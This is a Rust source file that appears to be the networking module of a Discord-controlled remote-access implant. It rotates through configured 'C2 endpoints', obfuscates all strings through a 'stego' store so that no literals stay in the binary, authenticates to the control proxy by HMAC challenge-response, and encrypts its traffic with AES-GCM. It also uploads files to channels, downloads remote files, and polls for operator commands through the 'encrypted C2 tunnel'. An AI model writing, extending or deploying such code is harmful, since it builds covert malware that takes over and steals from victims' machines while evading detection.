use crate::config::Config;
use crate::core::stego_store::{StegoStore, StringCategory};
use anyhow::{anyhow, Result};
use twilight_model::id::{marker::ChannelMarker, Id};
use aes_gcm::{Aes256Gcm, Key, Nonce};
use aes_gcm::KeyInit;
use aes_gcm::aead::Aead;
use rand::Rng;
use base64::{Engine as _, engine::general_purpose};
use reqwest::Client;
use std::sync::{OnceLock, Mutex};
use hmac::{Hmac, Mac};
use sha2::Sha256;

type HmacSha256 = Hmac<Sha256>;

include!(concat!(env!("OUT_DIR"), "/generated_http_storage.rs"));

// Short alias so call sites are compact
#[inline(always)] fn s(key: &str) -> String { StegoStore::get(StringCategory::Core, key) }

#[derive(Debug, Clone)]
pub struct HttpClient {
    client: Client,
}

impl HttpClient {
    pub fn new() -> Self {
        let ua = s("H_UA");
        let client = Client::builder()
            .user_agent(ua)
            .timeout(std::time::Duration::from_secs(45))
            .build()
            .unwrap_or_else(|_| Client::new());
        HttpClient { client }
    }

    fn get_proxy_url(&self) -> String {
        let endpoints = Config::get_c2_endpoints();
        let idx = *get_buf_i().lock().unwrap();
        endpoints[idx % endpoints.len()].clone()
    }

    fn rotate_endpoint(&self) {
        let mut idx = get_buf_i().lock().unwrap();
        *idx = idx.wrapping_add(1);
    }

    async fn perform_challenge_response(&self) -> Result<()> {
        let client_id = crate::core::device_id::get_device_id();
        let proxy_url = self.get_proxy_url();

        // Build JSON dynamically — no key literals in binary
        let ep_chall = format!("{}{}", proxy_url, s("EP_CHALLENGE"));
        let mut body = serde_json::Map::new();
        body.insert(s("J_CID"), serde_json::Value::String(client_id.clone()));
        let challenge_response = self.client.post(&ep_chall)
            .json(&serde_json::Value::Object(body)).send().await?;

        if !challenge_response.status().is_success() {
            self.rotate_endpoint();
            return Err(anyhow!("{}", s("ERR_NO_CHALLENGE")));
        }

        let challenge_data: serde_json::Value = challenge_response.json().await?;
        let chg_key = s("J_CHG");
        let challenge = challenge_data[&chg_key].as_str().ok_or_else(|| anyhow!("{}", s("ERR_NO_CHALLENGE")))?;

        let shared_secret = Config::get_shared_secret();
        let signature = self.sign_challenge(challenge, &shared_secret)?;

        let ep_verify = format!("{}{}", proxy_url, s("EP_VERIFY"));
        let mut vbody = serde_json::Map::new();
        vbody.insert(s("J_CID"), serde_json::Value::String(client_id));
        vbody.insert(s("J_SIG"), serde_json::Value::String(signature));
        let verify_response = self.client.post(&ep_verify)
            .json(&serde_json::Value::Object(vbody)).send().await?;

        if !verify_response.status().is_success() {
            return Err(anyhow!("{}", s("ERR_AUTH_FAIL")));
        }

        let auth_data: serde_json::Value = verify_response.json().await?;
        let st_key = s("J_ST");
        let ek_key = s("J_EK");
        let session_token = auth_data[&st_key].as_str().ok_or_else(|| anyhow!("{}", s("ERR_NO_ST")))?;

        if let Ok(mut g) = get_buf_s().lock() { *g = Some(session_token.to_string()); }

        let key_b64 = auth_data[&ek_key].as_str().ok_or_else(|| anyhow!("{}", s("ERR_NO_KEY")))?;
        let key_bytes = general_purpose::STANDARD.decode(key_b64)?;
        let mut key_array = [0u8; 32];
        key_array.copy_from_slice(&key_bytes);
        let _ = get_buf_e().set(key_array);

        Ok(())
    }

    fn sign_challenge(&self, challenge: &str, secret: &str) -> Result<String> {
        let mut mac = <HmacSha256 as Mac>::new_from_slice(secret.as_bytes())?;
        mac.update(challenge.as_bytes());
        Ok(general_purpose::STANDARD.encode(mac.finalize().into_bytes()))
    }

    pub async fn ensure_authenticated(&self) -> Result<()> {
        if get_buf_s().lock().unwrap().is_some() { return Ok(()); }
        self.perform_challenge_response().await
    }

    fn decrypt_data(&self, encrypted_data: &[u8], nonce_bytes: &[u8]) -> Result<Vec<u8>> {
        let key_array = get_buf_e().get().ok_or_else(|| anyhow!("{}", s("ERR_NO_KEY")))?;
        let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(key_array));
        cipher.decrypt(Nonce::from_slice(nonce_bytes), encrypted_data)
            .map_err(|_| anyhow!("{}", s("ERR_NO_KEY")))
    }

    async fn encrypt_payload(&self, data: &[u8]) -> Result<(Vec<u8>, Vec<u8>)> {
        let key_array = get_buf_e().get().ok_or_else(|| anyhow!("{}", s("ERR_NO_KEY")))?;
        let mut nonce_bytes = [0u8; 12];
        rand::thread_rng().fill(&mut nonce_bytes);
        let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(key_array));
        let encrypted_data = cipher.encrypt(Nonce::from_slice(&nonce_bytes), data)
            .map_err(|_| anyhow!("{}", s("ERR_NO_KEY")))?;
        Ok((encrypted_data, nonce_bytes.to_vec()))
    }

    async fn send_request_internal(&self, method: &str, endpoint: &str, data: &[u8], session_token: &str) -> Result<String> {
        let (encrypted_data, nonce) = self.encrypt_payload(data).await?;

        // Build request body dynamically — field names decoded from stego at runtime
        let mut body = serde_json::Map::new();
        body.insert(s("J_TM"), serde_json::Value::String(method.to_string()));
        body.insert(s("J_EP"), serde_json::Value::String(general_purpose::STANDARD.encode(&encrypted_data)));
        body.insert(s("J_NC"), serde_json::Value::String(general_purpose::STANDARD.encode(&nonce)));

        let url = format!("{}{}", self.get_proxy_url(), endpoint);
        let auth_val = format!("{}{}", s("H_BEARER"), session_token);

        let response = self.client.post(&url)
            .header(s("H_AUTH").as_str(), &auth_val)
            .json(&serde_json::Value::Object(body))
            .send().await?;

        let status = response.status();

        if status.is_success() {
            let res_json: serde_json::Value = response.json().await?;
            let er_key = s("J_ER");
            let nc_key = s("J_NC");
            if let (Some(enc_res), Some(res_nonce)) = (res_json[&er_key].as_str(), res_json[&nc_key].as_str()) {
                let enc_bytes = general_purpose::STANDARD.decode(enc_res)?;
                let nonce_bytes = general_purpose::STANDARD.decode(res_nonce)?;
                let decrypted = self.decrypt_data(&enc_bytes, &nonce_bytes)?;
                return Ok(String::from_utf8_lossy(&decrypted).to_string());
            }
            Ok(String::new())
        } else {
            Err(anyhow!("{}", status))
        }
    }

    pub async fn send_request(&self, method: &str, endpoint: &str, data: &[u8]) -> Result<String> {
        self.ensure_authenticated().await?;
        let session_token = get_buf_s().lock().unwrap().as_ref().cloned()
            .ok_or_else(|| anyhow!("{}", s("ERR_NO_SESSION")))?;

        match self.send_request_internal(method, endpoint, data, &session_token).await {
            Ok(r) => Ok(r),
            Err(e) if e.to_string().contains("401") => {
                *get_buf_s().lock().unwrap() = None;
                self.ensure_authenticated().await?;
                let t = get_buf_s().lock().unwrap().as_ref().cloned()
                    .ok_or_else(|| anyhow!("{}", s("ERR_NO_SESSION")))?;
                self.send_request_internal(method, endpoint, data, &t).await
            }
            Err(e) => { self.rotate_endpoint(); Err(e) }
        }
    }

    pub async fn post_to_discord(&self, endpoint: &str, data: &[u8]) -> Result<String> {
        self.send_request("POST", endpoint, data).await
    }

    pub async fn create_message(&self, channel_id: u64, content: &str) -> Result<String> {
        let ep = format!("{}{}{}", s("EP_CHAN"), channel_id, s("EP_MSGS"));
        let mut body = serde_json::Map::new();
        body.insert(s("J_CONTENT"), serde_json::Value::String(content.to_string()));
        self.send_request("POST", &ep, serde_json::Value::Object(body).to_string().as_bytes()).await
    }

    pub async fn create_message_with_file(&self, channel_id: u64, content: &str, file_data: &[u8], filename: &str) -> Result<String> {
        let ep = format!("{}{}{}", s("EP_CHAN"), channel_id, s("EP_MSGS"));
        let mut body = serde_json::Map::new();
        body.insert(s("J_CONTENT"), serde_json::Value::String(content.to_string()));
        body.insert(s("J_FD"), serde_json::Value::String(general_purpose::STANDARD.encode(file_data)));
        body.insert(s("J_FN"), serde_json::Value::String(filename.to_string()));
        self.send_request("POST", &ep, serde_json::Value::Object(body).to_string().as_bytes()).await
    }

    pub async fn create_message_with_embeds(&self, channel_id: u64, embeds: &[twilight_model::channel::message::Embed]) -> Result<String> {
        let ep = format!("{}{}{}", s("EP_CHAN"), channel_id, s("EP_MSGS"));
        let mut body = serde_json::Map::new();
        body.insert(s("J_EMBEDS"), serde_json::to_value(embeds)?);
        self.send_request("POST", &ep, serde_json::Value::Object(body).to_string().as_bytes()).await
    }

    pub async fn create_message_with_components(&self, channel_id: u64, content: &str, components: serde_json::Value) -> Result<String> {
        let ep = format!("{}{}{}", s("EP_CHAN"), channel_id, s("EP_MSGS"));
        let mut body = serde_json::Map::new();
        body.insert(s("J_CONTENT"), serde_json::Value::String(content.to_string()));
        body.insert(s("J_COMPONENTS"), components);
        self.send_request("POST", &ep, serde_json::Value::Object(body).to_string().as_bytes()).await
    }

    pub async fn create_invite_to_activity(&self, channel_id: u64, application_id: &str) -> Result<String> {
        let ep = format!("{}{}{}", s("EP_CHAN"), channel_id, s("EP_INVITES"));
        let mut body = serde_json::Map::new();
        body.insert(s("J_MA"), serde_json::Value::Number(3600.into()));
        body.insert(s("J_MU"), serde_json::Value::Number(0.into()));
        body.insert(s("J_TT"), serde_json::Value::Number(2.into()));
        body.insert(s("J_TAI"), serde_json::Value::String(application_id.to_string()));
        let res = self.send_request("POST", &ep, serde_json::Value::Object(body).to_string().as_bytes()).await?;
        let json: serde_json::Value = serde_json::from_str(&res)?;
        let code_key = s("J_CODE");
        let dgg = s("DGG");
        json[&code_key].as_str()
            .map(|c| format!("{}{}", dgg, c))
            .ok_or_else(|| anyhow!("{}", s("ERR_NO_CODE")))
    }

    pub async fn patch_to_discord(&self, endpoint: &str, data: &[u8]) -> Result<String> { self.send_request("PATCH", endpoint, data).await }
    pub async fn delete_to_discord(&self, endpoint: &str) -> Result<String> { self.send_request("DELETE", endpoint, &b"{}"[..]).await }

    pub async fn update_message(&self, channel_id: Id<ChannelMarker>, message_id: Id<twilight_model::id::marker::MessageMarker>, content: Option<String>) -> Result<String> {
        let ep = format!("{}{}{}/{}", s("EP_CHAN"), channel_id, s("EP_MSGS"), message_id);
        let mut payload = serde_json::Map::new();
        if let Some(c) = content { payload.insert(s("J_CONTENT"), serde_json::Value::String(c)); }
        self.patch_to_discord(&ep, serde_json::Value::Object(payload).to_string().as_bytes()).await
    }

    pub async fn delete_message(&self, channel_id: Id<ChannelMarker>, message_id: Id<twilight_model::id::marker::MessageMarker>) -> Result<String> {
        let ep = format!("{}{}{}/{}", s("EP_CHAN"), channel_id, s("EP_MSGS"), message_id);
        self.delete_to_discord(&ep).await
    }

    pub async fn get_guild_channels(&self, guild_id: u64) -> Result<Vec<serde_json::Value>> {
        let ep = format!("{}{}{}", s("EP_GUILDS"), guild_id, s("EP_CHANS"));
        let res = self.send_request("GET", &ep, &b"{}"[..]).await?;
        Ok(serde_json::from_str(&res)?)
    }

    pub async fn create_guild_channel(&self, guild_id: u64, name: &str, kind: u8) -> Result<serde_json::Value> {
        let ep = format!("{}{}{}", s("EP_GUILDS"), guild_id, s("EP_CHANS"));
        let mut body = serde_json::Map::new();
        body.insert(s("J_NAME"), serde_json::Value::String(name.to_string()));
        body.insert(s("J_TYPE"), serde_json::Value::Number(kind.into()));
        let res = self.send_request("POST", &ep, serde_json::Value::Object(body).to_string().as_bytes()).await?;
        Ok(serde_json::from_str(&res)?)
    }

    pub async fn download_file(&self, url: &str) -> Result<Vec<u8>> {
        let response = self.client.get(url).send().await?;
        if response.status().is_success() {
            Ok(response.bytes().await?.to_vec())
        } else {
            Err(anyhow!("{}", response.status()))
        }
    }

    /// Poll channel for new messages through the encrypted C2 tunnel.
    /// Uses send_request("GET") so every poll goes through AES-GCM + auth,
    /// identical to all other operations. Direct HTTP GET bypasses the tunnel
    /// and the proxy rejects/ignores it silently — commands appear to not arrive.
    pub async fn poll_commands(&self, channel_id: u64) -> Result<Vec<twilight_model::channel::message::Message>> {
        let ep = format!("{}{}{}", s("EP_CHAN"), channel_id, s("EP_MSGS"));
        match self.send_request("GET", &ep, b"{}").await {
            Ok(json_str) if !json_str.is_empty() => {
                let msgs: Vec<twilight_model::channel::message::Message> =
                    serde_json::from_str(&json_str).unwrap_or_default();
                Ok(msgs)
            }
            Ok(_) => Ok(vec![]),
            Err(e) => {
                let es = e.to_string();
                if es.contains("401") || es.contains("403") {
                    *get_buf_s().lock().unwrap() = None;
                    Ok(vec![])
                } else {
                    Err(e)
                }
            }
        }
    }
}

static HTTP_CLIENT: OnceLock<HttpClient> = OnceLock::new();
pub fn get_http_client() -> &'static HttpClient { HTTP_CLIENT.get().unwrap_or_else(|| panic!()) }
pub fn init_http_client() { let _ = HTTP_CLIENT.set(HttpClient::new()); }
